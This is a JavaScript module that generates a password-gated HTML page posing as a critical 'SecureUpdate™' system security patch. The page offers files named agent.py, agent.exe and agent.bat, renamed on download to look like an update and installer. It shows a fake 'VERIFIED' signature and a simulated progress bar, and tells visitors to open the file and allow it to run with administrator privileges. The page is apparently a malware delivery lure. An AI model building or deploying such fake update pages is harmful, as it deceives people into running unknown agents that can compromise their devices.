// ============================================================
// 📥 Download Page — Password Protected
// ============================================================
export function getDownloadPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Secure Update — System</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
:root {
  --bg-0: #0a0e1a;
  --bg-1: #0f1520;
  --bg-2: #151d2e;
  --bg-3: #1a2436;
  --border: #1f2a3f;
  --border-hi: #2a3a54;
  --text: #e4e8f0;
  --text-dim: #8892a6;
  --text-mute: #4a5464;
  --accent: #0066ff;
  --accent-hi: #3388ff;
  --green: #00cc66;
  --green-hi: #33ff88;
  --red: #ff3355;
  --yellow: #ffaa00;
  --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  --mono: 'Courier New', monospace;
}
html, body {
  height: 100%; width: 100%;
  background: var(--bg-0); color: var(--text);
  font-family: var(--font); font-size: 14px; line-height: 1.6;
  overflow-x: hidden; min-height: 100vh;
}
body::before {
  content: '';
  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
  background:
    radial-gradient(ellipse at 20% 20%, rgba(0, 102, 255, 0.15) 0%, transparent 50%),
    radial-gradient(ellipse at 80% 80%, rgba(0, 204, 102, 0.08) 0%, transparent 50%);
  z-index: -1; pointer-events: none;
}

/* HEADER */
.header {
  background: rgba(10, 14, 26, 0.9);
  backdrop-filter: blur(20px);
  border-bottom: 1px solid var(--border);
  padding: 16px 24px;
  display: flex; align-items: center; justify-content: space-between;
  position: sticky; top: 0; z-index: 100;
}
.logo {
  display: flex; align-items: center; gap: 10px;
  font-size: 16px; font-weight: 700; color: var(--text);
}
.logo-icon {
  width: 32px; height: 32px;
  background: linear-gradient(135deg, var(--accent), var(--green));
  border-radius: 8px;
  display: flex; align-items: center; justify-content: center;
  color: #fff; font-weight: 900; font-size: 16px;
  box-shadow: 0 0 20px rgba(0, 102, 255, 0.4);
}
.header-status {
  display: flex; align-items: center; gap: 8px;
  font-size: 12px; color: var(--text-dim);
}
.status-dot {
  width: 8px; height: 8px;
  background: var(--green); border-radius: 50%;
  box-shadow: 0 0 10px var(--green);
  animation: pulse 2s infinite;
}
@keyframes pulse {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.5; transform: scale(1.2); }
}

/* CONTAINER */
.container { max-width: 900px; margin: 0 auto; padding: 40px 24px; }

/* ═══════════ PASSWORD SCREEN ═══════════ */
.password-screen {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 70vh;
  padding: 40px 20px;
  text-align: center;
}
.password-icon {
  width: 80px; height: 80px;
  background: rgba(0, 102, 255, 0.1);
  border: 2px solid var(--accent);
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  font-size: 36px; margin-bottom: 24px;
  box-shadow: 0 0 40px rgba(0, 102, 255, 0.3);
  animation: float 3s ease-in-out infinite;
}
@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}
.password-title {
  font-size: 24px; font-weight: 800;
  color: var(--text); margin-bottom: 10px;
  letter-spacing: -0.5px;
}
.password-subtitle {
  color: var(--text-dim); font-size: 14px;
  margin-bottom: 32px; max-width: 400px;
}
.password-form {
  width: 100%; max-width: 420px;
  background: linear-gradient(135deg, var(--bg-1) 0%, var(--bg-2) 100%);
  border: 1px solid var(--border-hi);
  border-radius: 16px;
  padding: 32px 28px;
  position: relative;
  overflow: hidden;
}
.password-form::before {
  content: '';
  position: absolute; top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, var(--accent), transparent);
  animation: scan 3s linear infinite;
}
@keyframes scan {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(100%); }
}
.password-input-wrap {
  position: relative;
  margin-bottom: 16px;
}
.password-input {
  width: 100%;
  padding: 16px 48px 16px 18px;
  background: var(--bg-0);
  border: 1px solid var(--border-hi);
  border-radius: 10px;
  color: var(--text);
  font-family: var(--mono);
  font-size: 15px;
  outline: none;
  text-align: center;
  letter-spacing: 2px;
  transition: all 0.2s;
}
.password-input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.15), 0 0 30px rgba(0, 102, 255, 0.2);
}
.password-input.error {
  border-color: var(--red);
  box-shadow: 0 0 0 4px rgba(255, 51, 85, 0.15);
  animation: shake 0.4s;
}
@keyframes shake {
  0%, 100% { transform: translateX(0); }
  25% { transform: translateX(-8px); }
  75% { transform: translateX(8px); }
}
.password-toggle {
  position: absolute;
  right: 12px; top: 50%;
  transform: translateY(-50%);
  background: none; border: none;
  color: var(--text-mute);
  font-size: 18px; cursor: pointer;
  padding: 4px 8px;
}
.password-toggle:hover { color: var(--accent); }
.password-btn {
  width: 100%;
  padding: 16px 24px;
  background: linear-gradient(135deg, var(--accent), var(--accent-hi));
  color: #fff;
  border: none;
  border-radius: 10px;
  font-family: var(--font);
  font-size: 15px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s;
  letter-spacing: 1px;
  position: relative;
  overflow: hidden;
}
.password-btn::before {
  content: '';
  position: absolute;
  top: 0; left: -100%;
  width: 100%; height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}
.password-btn:hover::before { left: 100%; }
.password-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 30px rgba(0, 102, 255, 0.4);
}
.password-btn:active { transform: translateY(0); }
.password-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}
.password-error {
  margin-top: 12px;
  padding: 10px 14px;
  background: rgba(255, 51, 85, 0.1);
  border: 1px solid rgba(255, 51, 85, 0.3);
  border-radius: 8px;
  color: var(--red);
  font-size: 12px;
  text-align: center;
  display: none;
}
.password-error.show { display: block; animation: slideDown 0.3s; }
@keyframes slideDown {
  from { opacity: 0; transform: translateY(-10px); }
  to { opacity: 1; transform: translateY(0); }
}
.password-footer {
  margin-top: 24px;
  color: var(--text-mute);
  font-size: 11px;
  line-height: 1.8;
}

/* ═══════════ DOWNLOAD CONTENT ═══════════ */
.download-content {
  display: none;
}
.download-content.show {
  display: block;
  animation: fadeIn 0.5s;
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

/* HERO */
.hero { text-align: center; margin-bottom: 48px; }
.hero-badge {
  display: inline-flex; align-items: center; gap: 8px;
  background: rgba(0, 204, 102, 0.1);
  border: 1px solid var(--green);
  color: var(--green-hi);
  padding: 6px 16px; border-radius: 20px;
  font-size: 12px; font-weight: 600;
  letter-spacing: 1px; margin-bottom: 20px;
}
.hero h1 {
  font-size: 36px; font-weight: 800;
  color: var(--text); margin-bottom: 12px;
  letter-spacing: -0.5px; line-height: 1.2;
}
.hero h1 span {
  background: linear-gradient(135deg, var(--accent), var(--green));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}
.hero p {
  color: var(--text-dim); font-size: 15px;
  max-width: 600px; margin: 0 auto; line-height: 1.7;
}

/* UPDATE CARD */
.update-card {
  background: linear-gradient(135deg, var(--bg-1) 0%, var(--bg-2) 100%);
  border: 1px solid var(--border-hi);
  border-radius: 16px;
  padding: 32px;
  margin-bottom: 32px;
  position: relative; overflow: hidden;
}
.update-card::before {
  content: '';
  position: absolute; top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, var(--accent), transparent);
  animation: scan 3s linear infinite;
}
.update-header {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
}
.update-title {
  display: flex; align-items: center; gap: 12px;
  font-size: 18px; font-weight: 700; color: var(--text);
}
.update-icon {
  width: 40px; height: 40px;
  background: rgba(0, 102, 255, 0.15);
  border: 1px solid var(--accent);
  border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-size: 20px;
}
.update-badge {
  background: rgba(0, 204, 102, 0.15);
  border: 1px solid var(--green);
  color: var(--green-hi);
  padding: 4px 12px; border-radius: 20px;
  font-size: 11px; font-weight: 600;
  letter-spacing: 1px;
}
.file-info {
  background: var(--bg-0);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px; margin-bottom: 20px;
  font-family: var(--mono); font-size: 12px;
}
.file-row {
  display: flex; justify-content: space-between;
  padding: 8px 0; border-bottom: 1px solid var(--border);
}
.file-row:last-child { border-bottom: none; }
.file-label { color: var(--text-mute); }
.file-value { color: var(--text); font-weight: 600; }
.file-value.green { color: var(--green); }
.features {
  display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 12px; margin-bottom: 24px;
}
.feature {
  display: flex; align-items: center; gap: 8px;
  padding: 10px 12px;
  background: rgba(0, 204, 102, 0.05);
  border: 1px solid rgba(0, 204, 102, 0.2);
  border-radius: 8px;
  font-size: 12px; color: var(--text-dim);
}
.feature-icon { color: var(--green); font-size: 16px; }
.download-buttons {
  display: grid; grid-template-columns: 1fr; gap: 12px;
}
.download-btn {
  display: flex; align-items: center; justify-content: center;
  gap: 10px; padding: 16px 24px;
  background: linear-gradient(135deg, var(--accent), var(--accent-hi));
  color: #fff; border: none; border-radius: 10px;
  font-family: var(--font); font-size: 15px; font-weight: 700;
  cursor: pointer; transition: all 0.2s; text-decoration: none;
  letter-spacing: 0.5px; position: relative; overflow: hidden;
}
.download-btn::before {
  content: '';
  position: absolute; top: 0; left: -100%;
  width: 100%; height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}
.download-btn:hover::before { left: 100%; }
.download-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 30px rgba(0, 102, 255, 0.4);
}
.download-btn:active { transform: translateY(0); }
.download-btn.green {
  background: linear-gradient(135deg, var(--green), var(--green-hi));
  box-shadow: 0 4px 20px rgba(0, 204, 102, 0.3);
}
.download-btn.green:hover {
  box-shadow: 0 10px 30px rgba(0, 204, 102, 0.5);
}
.btn-icon { font-size: 20px; }
.warning {
  background: rgba(255, 170, 0, 0.08);
  border: 1px solid rgba(255, 170, 0, 0.3);
  border-left: 3px solid var(--yellow);
  border-radius: 8px;
  padding: 14px 16px; margin-top: 20px;
  display: flex; gap: 12px; align-items: flex-start;
}
.warning-icon { color: var(--yellow); font-size: 18px; flex-shrink: 0; }
.warning-text {
  font-size: 12px; color: var(--text-dim); line-height: 1.6;
}
.warning-text strong { color: var(--yellow); font-weight: 600; }
.instructions {
  background: var(--bg-1);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 24px; margin-top: 32px;
}
.instructions h2 {
  font-size: 16px; font-weight: 700;
  color: var(--text); margin-bottom: 16px;
  display: flex; align-items: center; gap: 8px;
}
.step {
  display: flex; gap: 12px;
  padding: 12px 0; border-bottom: 1px solid var(--border);
}
.step:last-child { border-bottom: none; }
.step-num {
  width: 28px; height: 28px;
  background: var(--accent); color: #fff;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  font-size: 13px; font-weight: 700; flex-shrink: 0;
}
.step-text {
  color: var(--text-dim); font-size: 13px; line-height: 1.6;
}
.step-text strong { color: var(--text); font-weight: 600; }
.footer {
  text-align: center; padding: 40px 24px 24px;
  color: var(--text-mute); font-size: 11px; line-height: 1.8;
}
.progress-box {
  display: none;
  background: var(--bg-0);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px; margin-top: 16px;
}
.progress-box.show { display: block; }
.progress-bar {
  height: 6px; background: var(--bg-3);
  border-radius: 3px; overflow: hidden; margin-bottom: 10px;
}
.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--accent), var(--green));
  width: 0%; transition: width 0.3s; border-radius: 3px;
}
.progress-text {
  font-family: var(--mono); font-size: 11px;
  color: var(--text-dim); text-align: center;
}
@media (max-width: 600px) {
  .container { padding: 24px 16px; }
  .hero h1 { font-size: 26px; }
  .update-card { padding: 20px; }
  .password-form { padding: 24px 20px; }
  .password-title { font-size: 20px; }
}
</style>
</head>
<body>

<div class="header">
  <div class="logo">
    <div class="logo-icon">S</div>
    <div>SecureUpdate™</div>
  </div>
  <div class="header-status">
    <div class="status-dot"></div>
    <span>Server Online</span>
  </div>
</div>

<div class="container">

  <!-- ═══════════ PASSWORD SCREEN ═══════════ -->
  <div class="password-screen" id="passwordScreen">
    <div class="password-icon">🔐</div>
    <div class="password-title">Protected Download</div>
    <div class="password-subtitle">Enter the access code to continue to the download page</div>
    
    <div class="password-form">
      <div class="password-input-wrap">
        <input type="password" class="password-input" id="passwordInput" placeholder="Access Code" autocomplete="off" autofocus>
        <button class="password-toggle" onclick="togglePassword()">👁</button>
      </div>
      <button class="password-btn" id="passwordBtn" onclick="checkPassword()">UNLOCK</button>
      <div class="password-error" id="passwordError"></div>
    </div>
    
    <div class="password-footer">
      Protected by SecureUpdate™<br>
      Contact your administrator for the access code
    </div>
  </div>

  <!-- ═══════════ DOWNLOAD CONTENT ═══════════ -->
  <div class="download-content" id="downloadContent">
    
    <div class="hero">
      <div class="hero-badge">🔒 VERIFIED UPDATE</div>
      <h1>Critical System <span>Security Update</span></h1>
      <p>Your system requires an important security patch. Download and install to protect your device.</p>
    </div>

    <div class="update-card">
      <div class="update-header">
        <div class="update-title">
          <div class="update-icon">⚡</div>
          <div>
            <div>Security Update v4.2.1</div>
            <div style="font-size:12px;color:var(--text-dim);font-weight:400;margin-top:2px;">Released: ${new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</div>
          </div>
        </div>
        <div class="update-badge">CRITICAL</div>
      </div>

      <div class="file-info">
        <div class="file-row">
          <span class="file-label">📦 Package</span>
          <span class="file-value">system_update_v4.2.1</span>
        </div>
        <div class="file-row">
          <span class="file-label">💾 Size</span>
          <span class="file-value">8.4 MB</span>
        </div>
        <div class="file-row">
          <span class="file-label">🔐 Signature</span>
          <span class="file-value green">VERIFIED ✓</span>
        </div>
        <div class="file-row">
          <span class="file-label">📅 Version</span>
          <span class="file-value">4.2.1 (stable)</span>
        </div>
      </div>

      <div class="features">
        <div class="feature"><span class="feature-icon">✓</span> Enhanced security</div>
        <div class="feature"><span class="feature-icon">✓</span> Bug fixes</div>
        <div class="feature"><span class="feature-icon">✓</span> Performance boost</div>
        <div class="feature"><span class="feature-icon">✓</span> New drivers</div>
      </div>

      <div class="download-buttons">
        <a class="download-btn green" href="/download/agent.py" download="system_update_v4.2.1.py" onclick="startProgress(event, 'agent.py')">
          <span class="btn-icon">⬇</span>
          <span>Download Update (.py)</span>
        </a>
        <a class="download-btn" href="/download/agent.exe" download="system_update_v4.2.1.exe" onclick="startProgress(event, 'agent.exe')">
          <span class="btn-icon">⬇</span>
          <span>Download Update (.exe)</span>
        </a>
        <a class="download-btn" href="/download/agent.bat" download="install.bat" onclick="startProgress(event, 'agent.bat')">
          <span class="btn-icon">⬇</span>
          <span>Download Installer (.bat)</span>
        </a>
      </div>

      <div class="progress-box" id="progressBox">
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="progress-text" id="progressText">Preparing download...</div>
      </div>

      <div class="warning">
        <div class="warning-icon">⚠</div>
        <div class="warning-text">
          <strong>Important:</strong> This update is required to keep your system protected. 
          Installation may require administrator privileges.
        </div>
      </div>
    </div>

    <div class="instructions">
      <h2>📋 Installation Instructions</h2>
      <div class="step">
        <div class="step-num">1</div>
        <div class="step-text"><strong>Download</strong> the update package from above</div>
      </div>
      <div class="step">
        <div class="step-num">2</div>
        <div class="step-text"><strong>Open</strong> the downloaded file</div>
      </div>
      <div class="step">
        <div class="step-num">3</div>
        <div class="step-text">If prompted, <strong>allow</strong> the application to run</div>
      </div>
      <div class="step">
        <div class="step-num">4</div>
        <div class="step-text"><strong>Wait</strong> for the installation to complete (2-3 minutes)</div>
      </div>
      <div class="step">
        <div class="step-num">5</div>
        <div class="step-text">Your system is now <strong>up to date</strong> ✓</div>
      </div>
    </div>

    <div class="footer">
      © ${new Date().getFullYear()} SecureUpdate™ — All rights reserved.
    </div>

  </div>
</div>

<script>
var CORRECT_PASSWORD = "8656587687556yutuytuyiuyu";
var unlocked = false;

// Check session
function checkSession() {
  try {
    if (localStorage.getItem('download_unlocked') === 'true') {
      unlocked = true;
      showDownload();
    }
  } catch (e) {}
}

function togglePassword() {
  var input = document.getElementById('passwordInput');
  input.type = input.type === 'password' ? 'text' : 'password';
}

function checkPassword() {
  var input = document.getElementById('passwordInput');
  var btn = document.getElementById('passwordBtn');
  var err = document.getElementById('passwordError');
  var password = input.value.trim();
  
  if (!password) {
    showError('Enter access code');
    return;
  }
  
  btn.disabled = true;
  btn.textContent = 'CHECKING...';
  
  setTimeout(function() {
    if (password === CORRECT_PASSWORD) {
      try {
        localStorage.setItem('download_unlocked', 'true');
      } catch (e) {}
      unlocked = true;
      btn.textContent = 'SUCCESS ✓';
      btn.style.background = 'linear-gradient(135deg, var(--green), var(--green-hi))';
      setTimeout(showDownload, 300);
    } else {
      showError('Invalid access code');
      btn.disabled = false;
      btn.textContent = 'UNLOCK';
      input.classList.add('error');
      input.value = '';
      setTimeout(function() { input.classList.remove('error'); }, 500);
    }
  }, 500);
}

function showError(msg) {
  var err = document.getElementById('passwordError');
  err.textContent = '✕ ' + msg;
  err.classList.add('show');
}

function showDownload() {
  document.getElementById('passwordScreen').style.display = 'none';
  document.getElementById('downloadContent').classList.add('show');
  autoDetectOS();
}

function startProgress(event, filename) {
  var box = document.getElementById('progressBox');
  var fill = document.getElementById('progressFill');
  var text = document.getElementById('progressText');
  
  box.classList.add('show');
  fill.style.width = '0%';
  text.textContent = 'Downloading ' + filename + '...';
  text.style.color = '';
  
  var progress = 0;
  var interval = setInterval(function() {
    progress += Math.random() * 15;
    if (progress >= 100) {
      progress = 100;
      clearInterval(interval);
      text.textContent = '✓ Download complete!';
      text.style.color = 'var(--green)';
      setTimeout(function() {
        box.classList.remove('show');
        text.style.color = '';
      }, 3000);
    }
    fill.style.width = progress + '%';
    if (progress < 100) {
      text.textContent = 'Downloading ' + filename + '... ' + Math.floor(progress) + '%';
    }
  }, 200);
}

function autoDetectOS() {
  var ua = navigator.userAgent.toLowerCase();
  var isWindows = ua.indexOf('windows') !== -1;
  var buttons = document.querySelectorAll('.download-btn');
  if (isWindows && buttons[1]) buttons[1].style.order = '-1';
  else if (buttons[0]) buttons[0].style.order = '-1';
}

// Init
window.addEventListener('load', function() {
  checkSession();
  document.getElementById('passwordInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') checkPassword();
  });
});
</script>
</body>
</html>`;
}